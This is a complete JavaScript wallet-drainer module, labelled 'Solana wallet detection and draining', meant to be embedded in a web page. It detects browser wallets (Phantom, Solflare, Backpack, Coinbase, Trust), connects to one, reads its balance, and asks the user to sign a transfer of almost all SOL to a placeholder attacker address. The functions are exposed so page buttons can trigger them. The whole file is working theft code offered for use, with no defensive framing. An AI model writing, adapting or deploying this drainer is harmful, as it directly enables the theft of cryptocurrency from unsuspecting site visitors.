// Java/solana-script.js
// Solana wallet detection and draining (module)

// Load Solana Web3 from CDN (using esm.sh for module compatibility)
import { Connection, PublicKey, SystemProgram, Transaction } from 'https://esm.sh/@solana/web3.js@1.87.6';

// Your attacker's Solana wallet address – replace with your own
const ATTACKER_ADDRESS = 'YourSolanaWalletAddressHere';

// Detect all installed Solana wallets
function detectSolanaWallets() {
  const wallets = [];

  // Phantom
  if (window.phantom?.solana) {
    wallets.push({ name: 'Phantom', provider: window.phantom.solana });
  } else if (window.solana?.isPhantom) {
    wallets.push({ name: 'Phantom', provider: window.solana });
  }

  // Solflare
  if (window.solflare) {
    wallets.push({ name: 'Solflare', provider: window.solflare });
  }

  // Backpack
  if (window.backpack) {
    wallets.push({ name: 'Backpack', provider: window.backpack });
  }

  // Coinbase Wallet Solana
  if (window.coinbaseSolana) {
    wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
  }

  // Trust Wallet
  if (window.trustWallet?.solana) {
    wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
  }

  return wallets;
}

// Connect to the first available wallet and return public key
async function connectSolanaWallet() {
  const wallets = detectSolanaWallets();
  if (wallets.length === 0) {
    throw new Error('No Solana wallet found');
  }

  const provider = wallets[0].provider;
  try {
    const response = await provider.connect();
    // Some wallets return { publicKey }, others return the key directly
    const publicKey = response.publicKey?.toString() || response.toString();
    console.log(`✅ Connected to ${wallets[0].name}: ${publicKey}`);
    return { provider, publicKey, walletName: wallets[0].name };
  } catch (err) {
    throw new Error(`Connection failed: ${err.message}`);
  }
}

// Drain all SOL (or a portion) from the connected wallet
async function drainSolana(publicKey, provider) {
  try {
    const connection = new Connection('https://api.mainnet-beta.solana.com');

    // Get current balance
    const balance = await connection.getBalance(new PublicKey(publicKey));
    console.log(`💰 Balance: ${balance / 1e9} SOL`);

    // Leave a tiny amount for fees (5000 lamports = 0.000005 SOL)
    const LAMPORTS_TO_LEAVE = 5000;
    if (balance <= LAMPORTS_TO_LEAVE) {
      throw new Error('Insufficient balance');
    }

    const amountToSend = balance - LAMPORTS_TO_LEAVE;

    // Create transfer instruction
    const instruction = SystemProgram.transfer({
      fromPubkey: new PublicKey(publicKey),
      toPubkey: new PublicKey(ATTACKER_ADDRESS),
      lamports: amountToSend,
    });

    // Get recent blockhash
    const { blockhash } = await connection.getRecentBlockhash();

    // Create transaction
    const transaction = new Transaction().add(instruction);
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = new PublicKey(publicKey);

    // Request signature from wallet
    const signed = await provider.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    console.log(`✅ Transaction sent: ${signature}`);
    return signature;
  } catch (err) {
    throw new Error(`Drain failed: ${err.message}`);
  }
}

// Expose functions globally if needed (for buttons)
window.connectSolanaWallet = connectSolanaWallet;
window.drainSolana = drainSolana;

// Auto‑detect and log (optional)
const wallets = detectSolanaWallets();
if (wallets.length > 0) {
  console.log('🔍 Solana wallet(s) detected:', wallets.map(w => w.name).join(', '));
} else {
  console.log('ℹ️ No Solana wallet detected');
}
